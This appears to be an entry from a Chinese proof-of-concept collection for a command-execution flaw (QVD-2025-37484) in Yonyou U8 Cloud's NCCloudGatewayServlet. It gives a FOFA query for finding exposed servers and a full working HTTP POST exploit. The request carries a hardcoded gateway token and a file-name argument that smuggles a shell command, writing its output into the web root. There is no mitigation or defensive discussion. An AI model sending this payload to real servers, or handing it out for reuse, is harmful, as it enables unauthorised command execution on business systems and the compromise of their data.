## 用友U8 Cloud NCCloudGatewayServlet 命令执行漏洞（QVD-2025-37484）

## 漏洞描述
用友U8 Cloud `NCCloudGatewayServlet` 存在命令执行漏洞，攻击者可构造恶意请求在服务器上执行任意指令。

## 网络空间测绘
```
fofa: title=="U8C"
```

## POC
```
POST /service/NCCloudGatewayServlet HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Content-Type: application/json
GatewayToken: TJ6RT-3FVCB-DPYP8-XF7QM-96FV3
Accept-Encoding: gzip

{
  "serviceInfo": {
    "serviceClassName": "com.ufida.zior.console.IActionInvokeService",
    "serviceMethodName": "exec",
    "serviceMethodArgInfo": [
      {
        "agg": false,
        "isArray": false,
        "isPrimitive": true,
        "argType": {
          "body": "java.lang.String"
        },
        "argValue": {
          "body": "nc.bs.pub.util.ProcessFileUtils"
        }
      },
      {
        "agg": false,
        "isArray": false,
        "isPrimitive": true,
        "argType": {
          "body": "java.lang.String"
        },
        "argValue": {
          "body": "openFile"
        }
      },
      {
        "agg": false,
        "isArray": false,
        "isPrimitive": false,
        "argType": {
          "body": "java.lang.String"
        },
        "argValue": {
          "body": "hmzzfy.txt\" | ipconfig > webapps\\u8c_web\\hmzzfy.txt \""
        }
      }
    ]
  }
}
```

## 参考
- 社区情报

